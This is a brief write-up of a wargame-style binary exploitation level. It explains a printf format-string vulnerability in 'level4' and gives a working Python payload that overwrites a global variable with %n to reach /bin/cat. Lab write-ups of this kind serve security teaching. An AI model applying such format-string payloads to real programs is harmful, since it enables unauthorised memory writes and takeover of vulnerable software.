## LEVEL 4 HELP

the level4 binary make call to printf with format directly used in, without any protection which make it vulnerable, we just need to know where we can access memory throught the print and exploit it to edit the global m variable to the good value and access to the /bin/cat

### USAGE

```bash
./level4
[input]
```

## SOLUTION
To solve this level, you can use the following python command to create the payload and run the binary:

```bash
./level4 << EOF
$(python -c 'print("\x10\x98\x04\x08" + "%13$16930112c" + "%12$n" + "\x44\x55\x02\x01")')
EOF
```
